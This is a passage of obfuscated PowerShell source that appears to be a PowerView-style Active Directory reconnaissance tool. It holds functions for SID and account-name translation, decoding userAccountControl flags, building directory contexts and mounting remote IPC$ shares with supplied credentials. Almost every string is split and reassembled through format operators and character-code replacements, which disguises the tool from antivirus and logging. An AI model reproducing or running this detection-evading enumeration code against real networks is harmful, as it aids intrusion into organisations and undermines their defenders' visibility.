        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters[("{1}{2}{0}" -f 'ial','Cred','ent')]) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments[("{1}{0}{2}" -f'enti','Id','ty')] = $UserName
                    $DomainSearcherArguments[("{0}{2}{1}"-f 'D','n','omai')] = $UserDomain
                    $DomainSearcherArguments[("{3}{2}{0}{1}"-f'e','rties','op','Pr')] = ("{2}{1}{0}" -f'tsid','bjec','o')
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[("{0}{1}"-f'Dom','ain')]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose ('[C'+'onvertTo'+'-SID'+'] '+'Err'+'o'+'r '+'conv'+'e'+'rting '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function ConvertFrom-SID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}" -f '1-.*','^S-'})]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Doma','inCo','ntroller'})]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters[("{1}{2}{0}"-f'n','Doma','i')]) { $ADNameArguments[("{0}{1}"-f 'D','omain')] = $Domain }
        if ($PSBoundParameters[("{1}{0}"-f 'rver','Se')]) { $ADNameArguments[("{0}{1}"-f 'Serv','er')] = $Server }
        if ($PSBoundParameters[("{2}{1}{0}"-f 'al','i','Credent')]) { $ADNameArguments[("{0}{2}{1}"-f 'Cre','al','denti')] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                
                Switch ($TargetSid) {
                    ("{1}{0}"-f '0','S-1-')         { ("{3}{0}{1}{2}" -f' ','Auth','ority','Null') }
                    ("{1}{0}{2}"-f'1-0-','S-','0')       { ("{1}{0}" -f 'y','Nobod') }
                    ("{0}{1}"-f'S-1-','1')         { ("{1}{0}{2}{3}"-f'Au','World ','th','ority') }
                    ("{2}{0}{1}" -f '-','1-1-0','S')       { ("{0}{1}{2}"-f 'E','v','eryone') }
                    ("{1}{0}" -f'2','S-1-')         { ("{3}{2}{1}{0}{4}"-f'rit','ho','l Aut','Loca','y') }
                    ("{0}{1}" -f'S-','1-2-0')       { ("{0}{1}" -f 'L','ocal') }
                    ("{2}{0}{1}" -f '-','1-2-1','S')       { ("{1}{0}{2}{3}" -f 's','Con','ole Lo','gon ') }
                    ("{1}{0}" -f '-3','S-1')         { ("{4}{1}{3}{2}{0}"-f 'hority','rea','r Aut','to','C') }
                    ("{0}{2}{1}"-f'S','-3-0','-1')       { ("{3}{0}{1}{2}" -f'at','or Own','er','Cre') }
                    ("{0}{1}{2}"-f 'S-1','-3-','1')       { ("{1}{2}{0}"-f'up','Crea','tor Gro') }
                    ("{1}{0}" -f '-1-3-2','S')       { ("{4}{1}{5}{3}{0}{2}" -f 'v','tor Own','er','er','Crea','er S') }
                    ("{0}{2}{1}" -f 'S','3-3','-1-')       { ("{0}{3}{2}{4}{1}" -f 'Cr','r','roup Se','eator G','rve') }
                    ("{0}{1}" -f 'S','-1-3-4')       { ("{1}{2}{0}" -f 'ts','O','wner Righ') }
                    ("{0}{1}"-f'S-1-','4')         { ("{3}{2}{0}{4}{1}{5}" -f 'e Auth','it','qu','Non-uni','or','y') }
                    ("{1}{0}"-f'-1-5','S')         { ("{3}{0}{1}{2}"-f 'ut','h','ority','NT A') }
                    ("{2}{0}{1}" -f '1-','5-1','S-')       { ("{1}{0}"-f 'lup','Dia') }
                    ("{1}{0}" -f'1-5-2','S-')       { ("{1}{0}{2}"-f'wor','Net','k') }
                    ("{1}{0}{2}" -f '1-','S-','5-3')       { ("{1}{0}" -f 'ch','Bat') }
                    ("{1}{2}{0}"-f'-4','S','-1-5')       { ("{1}{0}{2}" -f 'ntera','I','ctive') }
                    ("{1}{0}{2}"-f'1-','S-','5-6')       { ("{1}{0}"-f'ice','Serv') }
                    ("{1}{0}{2}"-f'1-5','S-','-7')       { ("{2}{1}{0}" -f 's','mou','Anony') }
                    ("{0}{2}{1}" -f 'S-1','5-8','-')       { ("{1}{0}"-f 'y','Prox') }
                    ("{1}{0}" -f '-1-5-9','S')       { ("{1}{3}{0}{6}{7}{2}{5}{4}"-f 'se Domain ','Enterpr','l','i','rs','e','Contr','ol') }
                    ("{2}{0}{1}"-f '-5-','10','S-1')      { ("{2}{1}{3}{0}" -f 'Self','c','Prin','ipal ') }
                    ("{0}{1}"-f 'S-1','-5-11')      { ("{4}{5}{3}{0}{1}{2}" -f'c','ated Use','rs','enti','Au','th') }
                    ("{2}{0}{1}"-f '-1-5-','12','S')      { ("{1}{3}{4}{2}{0}"-f'Code','Re','ed ','stric','t') }
                    ("{1}{2}{0}" -f '3','S-1-5','-1')      { ("{0}{4}{1}{3}{6}{2}{5}" -f 'Ter','nal ','ser','Ser','mi','s','ver U') }
                    ("{2}{0}{1}"-f'1-','5-14','S-')      { ("{5}{3}{0}{4}{1}{2}"-f'tera','ve Logo','n','emote In','cti','R') }
                    ("{2}{1}{0}" -f'5','1-5-1','S-')      { ("{4}{0}{3}{2}{1}" -f 'his Or',' ','ization','gan','T') }
                    ("{0}{1}"-f 'S-1-','5-17')      { ("{0}{2}{1}{3}"-f'This Orga','ization','n',' ') }
                    ("{0}{2}{1}" -f'S-1-5','8','-1')      { ("{0}{2}{1}"-f 'Local Sys','m','te') }
                    ("{2}{0}{1}"-f'-1','-5-19','S')      { ("{1}{3}{2}{0}"-f'y','NT Aut','t','hori') }
                    ("{2}{1}{0}" -f'5-20','-','S-1')      { ("{1}{2}{0}"-f 'Authority','NT',' ') }
                    ("{1}{2}{0}" -f'-0','S','-1-5-80')    { ("{1}{2}{0}" -f 'es ','Al','l Servic') }
                    ("{1}{2}{0}{3}"-f'-5','S-1-5-','32','44')  { ((("{2}{5}{3}{6}{4}{0}{1}" -f'stra','tors','BU','yfEAdmi','i','ILTIN','n')).REPlace('yfE','\')) }
                    ("{0}{2}{3}{1}" -f 'S','545','-1-5-32','-')  { ((("{4}{1}{3}{0}{2}"-f'r','LTINcjoUs','s','e','BUI')).REPlAce(([chAr]99+[chAr]106+[chAr]111),'\')) }
                    ("{2}{1}{3}{0}" -f'5-32-546','1','S-','-')  { ((("{1}{2}{0}" -f 's','BUILTIN{0}','Guest')) -F[chaR]92) }
                    ("{2}{1}{0}"-f '5-32-547','-1-','S')  { ((("{2}{3}{0}{1}" -f'er Us','ers','BUILT','IN{0}Pow'))-f[char]92) }
                    ("{2}{3}{0}{1}"-f'5-','32-548','S-','1-')  { ((("{4}{5}{1}{3}{0}{2}" -f 'nt Ope','IN{0}Ac','rators','cou','BUI','LT'))-F[cHAr]92) }
                    ("{0}{1}{2}" -f'S-1-5-32-','5','49')  { ((("{1}{4}{6}{2}{5}{3}{0}"-f'ors','B','N{0','r Operat','UI','}Serve','LTI')) -f[CHAR]92) }
                    ("{1}{2}{0}{3}" -f'-3','S-','1-5','2-550')  { ((("{0}{5}{4}{1}{3}{2}"-f 'BUI','rint ','ators','Oper','IN{0}P','LT'))-f[chAR]92) }
                    ("{2}{3}{0}{1}"-f '32-55','1','S','-1-5-')  { ((("{2}{4}{0}{3}{1}{5}" -f 'O','r','BUILTIN','perato','lySBackup ','s')).repLACe('lyS',[sTRing][cHaR]92)) }
                    ("{0}{2}{1}" -f'S-1-','32-552','5-')  { ((("{0}{2}{4}{3}{1}"-f 'B','tors','UILTINRAWRep','ica','l'))-CrEplaCE 'RAW',[CHar]92) }
                    ("{0}{1}{2}" -f 'S-1-5-32','-','554')  { ((("{7}{2}{8}{0}{3}{4}{6}{9}{5}{1}" -f'N24','ss','IL','b','Pre-Window','ompatible Acce','s 2','BU','TI','000 C')) -rEPlACE  ([ChAr]50+[ChAr]52+[ChAr]98),[ChAr]92) }
                    ("{1}{2}{0}"-f '555','S-1-','5-32-')  { ((("{4}{6}{3}{7}{5}{1}{0}{2}" -f'top ',' Desk','Users','I','B','e','U','LTIN24IRemot')).rEpLAcE(([cHar]50+[cHar]52+[cHar]73),'\')) }
                    ("{1}{2}{0}"-f '6','S-','1-5-32-55')  { ((("{1}{0}{2}{4}{3}{5}{7}{6}" -f'TIN','BUIL','{','onfigu','0}Network C','r','erators','ation Op')) -F  [chAr]92) }
                    ("{0}{1}{2}{3}"-f'S-','1','-5-32-5','57')  { ((("{6}{2}{1}{0}{4}{3}{5}" -f't T','ming Fores','LTIN{0}Inco','t ','rus','Builders','BUI'))  -f [cHar]92) }
                    ("{0}{3}{2}{1}" -f'S','558','5-32-','-1-')  { ((("{0}{6}{4}{3}{7}{5}{1}{2}"-f 'BU','onito','r Users','rm','fo','ce M','ILTIN{0}Per','an')) -f [ChAR]92) }
                    ("{1}{0}{3}{2}"-f '3','S-1-5-','9','2-55')  { ((("{2}{7}{1}{0}{5}{6}{3}{8}{4}"-f'N{0','LTI','B','og ','s','}Performa','nce L','UI','User'))-F [char]92) }
                    ("{1}{2}{0}" -f '2-560','S-1-','5-3')  { ((("{8}{0}{6}{2}{1}{3}{5}{7}{4}" -f'N6vkWi','rizat',' Autho','ion','ess Group',' ','ndows','Acc','BUILTI'))  -rePLAce  ([ChAr]54+[ChAr]118+[ChAr]107),[ChAr]92) }
                    ("{0}{1}{2}" -f 'S','-','1-5-32-561')  { ((("{4}{5}{1}{12}{11}{3}{8}{2}{7}{6}{0}{10}{9}"-f'cense Se','T','erv','n','B','UIL','Li','er ','al S','vers','r','mi','IN3x9Ter')).rePlAce(([Char]51+[Char]120+[Char]57),'\')) }
                    ("{1}{2}{3}{0}"-f'2-562','S-1-5','-','3')  { ((("{3}{2}{6}{1}{4}{0}{5}" -f 'OM','istrib','U','B','uted C',' Users','ILTIN{0}D'))-F [cHar]92) }
                    ("{3}{1}{2}{0}"-f '69','5-32','-5','S-1-')  { ((("{5}{4}{6}{0}{1}{3}{2}"-f 'togr','aphic','perators',' O','NtPmC','BUILTI','ryp')).rEplaCE(([cHAr]116+[cHAr]80+[cHAr]109),'\')) }
                    ("{2}{0}{1}" -f '-5-32','-573','S-1')  { ((("{2}{5}{3}{7}{6}{1}{0}{4}"-f'ea','g R','B','{0}','ders','UILTIN','vent Lo','E'))-f [cHAR]92) }
                    ("{2}{0}{1}" -f '2','-574','S-1-5-3')  { ((("{5}{1}{3}{9}{8}{2}{4}{0}{7}{6}"-f'OM','I','ce','LTI',' DC','BU','ccess',' A','ate Servi','N6DcCertific'))-REPLaCE  '6Dc',[chAR]92) }
                    ("{0}{1}{2}{3}"-f'S','-1-5-3','2','-575')  { ((("{6}{4}{5}{0}{3}{8}{7}{1}{2}" -f 'ot','v','ers','e Access','RDS ','Rem','BUILTIN{0}','er',' S'))  -F  [char]92) }
                    ("{3}{2}{1}{0}"-f '-32-576','5','-','S-1')  { ((("{5}{7}{1}{6}{2}{3}{4}{0}"-f 'rs','p','t S','erv','e','BUILT','oin','INCDqRDS End')) -ReplaCE([cHAR]67+[cHAR]68+[cHAR]113),[cHAR]92) }
                    ("{2}{3}{0}{1}"-f '5','77','S-1-5-','32-')  { ((("{5}{6}{2}{4}{3}{7}{0}{1}"-f 'erv','ers','I','ment ','N3ySRDS Manage','BU','ILT','S')).rePLacE('3yS','\')) }
                    ("{3}{0}{1}{2}"-f '1-5','-32-57','8','S-')  { ((("{5}{3}{2}{0}{1}{4}"-f 'is','trat','Hyper-V Admin','Fm','ors','BUILTINM'))-CReplAcE  ([cHAR]77+[cHAR]70+[cHAR]109),[cHAR]92) }
                    ("{0}{1}{2}"-f'S-1-5','-','32-579')  { ((("{8}{0}{3}{5}{7}{6}{9}{4}{2}{1}" -f 'A','rators','e Ope','ccess','c',' C','ntrol Assista','o','BUILTINNSK','n'))-crEplAcE  'NSK',[ChAR]92) }
                    ("{2}{0}{3}{1}" -f'-5','580','S-1','-32-')  { ((("{7}{6}{1}{4}{5}{2}{3}{0}{8}"-f 'era','N','ol Assistance',' Op','{0}Access Cont','r','I','BUILT','tors'))  -f [cHAR]92) }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose ('[Con'+'ver'+'tF'+'r'+'om-SID]'+' '+'E'+'rror '+'converti'+'n'+'g '+'SID'+' '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function Convert-ADName {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{0}{4}{5}{1}{6}{3}{2}" -f 'UseShou','ocessF','ctions','teChangingFun','ld','Pr','orSta','PS'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}"-f'Nam','e'}, {"{2}{3}{1}{0}"-f 'me','ctNa','O','bje'})]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', {"{0}{1}{2}" -f 'Ca','noni','cal'}, 'NT4', {"{1}{2}{0}"-f'ay','Di','spl'}, {"{3}{0}{1}{2}" -f'ma','inSi','mple','Do'}, {"{3}{0}{1}{2}"-f'rise','Simp','le','Enterp'}, {"{1}{0}" -f 'D','GUI'}, {"{2}{0}{1}"-f'nknow','n','U'}, 'UPN', {"{2}{1}{0}"-f 'lEx','a','Canonic'}, 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{1}{2}{0}" -f'er','o','ll','ainContr','Dom'})]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  
            ("{0}{1}{2}" -f 'C','anonic','al')         =   2  
            'NT4'               =   3  
            ("{1}{2}{0}"-f 'ay','Dis','pl')           =   4  
            ("{2}{1}{0}"-f 'imple','S','Domain')      =   5  
            ("{3}{2}{4}{0}{1}" -f'imp','le','rise','Enterp','S')  =   6  
            ("{0}{1}"-f'G','UID')              =   7  
            ("{1}{0}"-f'own','Unkn')           =   8  
            'UPN'               =   9  
            ("{1}{0}{2}"-f'calE','Canoni','x')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, ("{2}{0}{1}" -f 'vokeMeth','od','In'), $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, ("{0}{2}{1}" -f 'Get','roperty','P'), $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, ("{1}{0}{2}" -f'e','S','tProperty'), $NULL, $Object, $Parameters)
        }

        
        if ($PSBoundParameters[("{0}{1}" -f'S','erver')]) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters[("{1}{0}{2}" -f'oma','D','in')]) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters[("{1}{0}{3}{2}"-f 'd','Cre','ntial','e')]) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters[("{2}{1}{0}"-f'tType','tpu','Ou')]) {
                if ($TargetIdentity -match ((("{5}{0}{3}{2}{1}{4}"-f'-Za-z]+yF7yF7[A-',' ]','-z','Za','+','^[A')).REpLaCe(([CHAR]121+[CHAR]70+[CHAR]55),[sTrinG][CHAR]92))) {
                    $ADSOutputType = $NameTypes[("{1}{0}{2}" -f'm','Do','ainSimple')]
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters[("{2}{1}{3}{0}"-f 'al','e','Cr','denti')]) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate ("{0}{1}" -f 'InitE','x') (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose ('[C'+'onvert-A'+'D'+'Nam'+'e]'+' '+'Err'+'or '+'init'+'ial'+'iz'+'ing '+'tr'+'a'+'n'+'slation '+'f'+'or '+"'$Identity' "+'usi'+'ng '+'alte'+'rn'+'ate'+' '+'c'+'redentia'+'ls'+' '+': '+"$_")
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate ("{1}{0}" -f't','Ini') (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose ('[Convert-'+'AD'+'Name]'+' '+'E'+'rror '+'initia'+'li'+'zing '+'tran'+'slation'+' '+'f'+'or '+"'$Identity' "+': '+"$_")
                }
            }

            
            Set-Property $Translate ("{3}{2}{1}{0}"-f 'erral','ef','R','Chase') (0x60)

            try {
                
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function ConvertFrom-UACValue {


    [OutputType({"{0}{2}{6}{1}{7}{4}{8}{12}{10}{9}{11}{5}{3}" -f'System.Coll','eci','ection','y','d.O','nar','s.Sp','alize','rdere','ti','c','o','dDi'})]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', {"{1}{3}{5}{4}{0}{2}" -f'ro','user','l','acc','tcont','oun'})]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add(("{1}{0}" -f 'RIPT','SC'), 1)
        $UACValues.Add(("{2}{1}{0}" -f'LE','COUNTDISAB','AC'), 2)
        $UACValues.Add(("{0}{2}{4}{1}{3}"-f 'HOMED','E','IR_','QUIRED','R'), 8)
        $UACValues.Add(("{1}{0}" -f 'OUT','LOCK'), 16)
        $UACValues.Add(("{2}{1}{0}"-f'_NOTREQD','WD','PASS'), 32)
        $UACValues.Add(("{5}{4}{0}{1}{3}{2}" -f'NT','_CH','GE','AN','SSWD_CA','PA'), 64)
        $UACValues.Add(("{1}{3}{4}{2}{0}" -f'WD_ALLOWED','EN','T_P','CRYPTED_','TEX'), 128)
        $UACValues.Add(("{2}{1}{0}{3}" -f 'UPLICATE_','MP_D','TE','ACCOUNT'), 256)
        $UACValues.Add(("{2}{0}{1}" -f'CCOUN','T','NORMAL_A'), 512)
        $UACValues.Add(("{6}{4}{1}{5}{0}{3}{2}" -f 'ST_ACC','MAIN','NT','OU','O','_TRU','INTERD'), 2048)
        $UACValues.Add(("{2}{1}{5}{4}{6}{3}{0}" -f'UNT','TION','WORKSTA','O','ST','_TRU','_ACC'), 4096)
        $UACValues.Add(("{2}{3}{0}{1}{4}" -f'ER_TRU','S','SER','V','T_ACCOUNT'), 8192)
        $UACValues.Add(("{3}{1}{4}{0}{2}"-f 'SSWO','_EXPIRE','RD','DONT','_PA'), 65536)
        $UACValues.Add(("{1}{3}{4}{2}{0}" -f 'NT','MNS_LO','COU','GON','_AC'), 131072)
        $UACValues.Add(("{0}{2}{3}{4}{1}" -f'SM','REQUIRED','ARTC','AR','D_'), 262144)
        $UACValues.Add(("{2}{6}{1}{0}{3}{4}{5}"-f'OR_','F','TRU','DELEG','ATI','ON','STED_'), 524288)
        $UACValues.Add(("{1}{2}{0}{3}" -f'DELE','N','OT_','GATED'), 1048576)
        $UACValues.Add(("{3}{1}{0}{2}"-f 'KEY_','S_','ONLY','USE_DE'), 2097152)
        $UACValues.Add(("{3}{2}{0}{1}{4}"-f'_','PR','NT_REQ','DO','EAUTH'), 4194304)
        $UACValues.Add(("{2}{4}{0}{3}{5}{1}" -f 'OR','D','PASS','D_E','W','XPIRE'), 8388608)
        $UACValues.Add(("{6}{2}{5}{1}{4}{3}{0}"-f'ELEGATION','H_F','U','R_D','O','T','TRUSTED_TO_A'), 16777216)
        $UACValues.Add(("{2}{0}{3}{4}{1}"-f 'TIA','UNT','PAR','L_SECRE','TS_ACCO'), 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{0}{1}"-f'r','ocess','dP','PSS','houl'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias({"{1}{0}" -f 'e','GroupNam'}, {"{0}{3}{1}{2}{4}"-f'G','oupIde','ntit','r','y'})]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters[("{1}{0}{2}"-f 'i','Doma','n')] -or ($Identity -match ((("{1}{0}" -f'.+','.+jufjuf')).rEpLAcE(([CHAr]106+[CHAr]117+[CHAr]102),'\')))) {
            if ($Identity -match ((("{1}{0}{2}" -f 'GdXGdX.','.+','+')).rEPlaCe('GdX','\'))) {
                
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose ('['+'Get-P'+'ri'+'n'+'c'+'ipalCo'+'ntext] '+'Bin'+'din'+'g '+'to'+' '+'dom'+'ain '+"'$ConnectTarget'")
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose ('[Get-P'+'ri'+'nci'+'palContext'+']'+' '+'B'+'inding'+' '+'t'+'o '+'dom'+'ain '+"'$Domain'")
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters[("{1}{3}{0}{2}"-f 'i','Cr','al','edent')]) {
                Write-Verbose ("{7}{0}{8}{5}{3}{2}{6}{9}{4}{10}{1}{11}" -f'et-Princip','l','] Using','ntext','nti','o',' al','[G','alC','ternate crede','a','s')
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters[("{1}{2}{0}" -f'ial','C','redent')]) {
                Write-Verbose ("{3}{0}{5}{2}{8}{1}{9}{10}{4}{6}{7}"-f'G','lternate cr','t]','[','t','et-PrincipalContex','ia','ls',' Using a','ed','en')
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty ("{2}{1}{0}"-f'xt','nte','Co') $Context
        $Out | Add-Member Noteproperty ("{0}{1}{2}"-f 'Id','e','ntity') $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning ('[G'+'et-Pri'+'ncipalCon'+'t'+'ext] '+'E'+'rro'+'r '+'cre'+'ating'+' '+'bin'+'di'+'ng '+'fo'+'r '+'obje'+'c'+'t '+"('$Identity') "+'cont'+'ext'+' '+': '+"$_")
    }
}


function Add-RemoteConnection {


    [CmdletBinding(DefaultParameterSetName = {"{1}{3}{2}{0}"-f 'ame','Com','uterN','p'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "COMP`Uter`N`AmE", ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{2}{1}"-f'HostNa','e','m'}, {"{0}{3}{1}{2}"-f 'dn','nam','e','shost'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = "P`Ath", Mandatory = $True)]
        [ValidatePattern({(("{4}{1}{0}{5}{2}{3}"-f 'O','LwOLw','wOL.*wOLwO','L.*','wO','L')).RePLaCe('wOL','\')})]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[("{0}{1}{3}{2}" -f 'Co','mputer','ame','N')]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose ('[Add-Re'+'m'+'ot'+'eCo'+'n'+'n'+'ection] '+'A'+'ttemp'+'ting '+'to'+' '+'mount'+':'+' '+"$TargetPath")

            
            
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose ("$TargetPath "+'s'+'uc'+'cessfu'+'lly '+'mo'+'unte'+'d')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function Remove-RemoteConnection {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{4}{3}{1}{0}{7}{2}{5}"-f 'tateC','cessForS','ct','ldPro','hou','ions','PSUseS','hangingFun'}, '')]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}{2}{3}" -f 'Co','m','puter','Name'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "compUTe`R`NAmE", ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}" -f'ostNam','e','H'}, {"{1}{2}{0}" -f 'stname','dn','sho'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = "P`ATH", Mandatory = $True)]
        [ValidatePattern({(("{4}{0}{1}{3}{5}{2}"-f 'u','vhuvhu','*','.*vh','vhuvh','uvhu.'))-CREPLAce([cHAR]118+[cHAR]104+[cHAR]117),[cHAR]92})]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters[("{3}{0}{2}{1}"-f'omp','erName','ut','C')]) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose ('['+'R'+'emov'+'e-RemoteConne'+'cti'+'on] '+'At'+'tempt'+'in'+'g '+'t'+'o '+'u'+'nm'+'ount: '+"$TargetPath")
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose ("$TargetPath "+'succe'+'ssfu'+'lly'+' '+'um'+'mo'+'unted')
            }
            else {
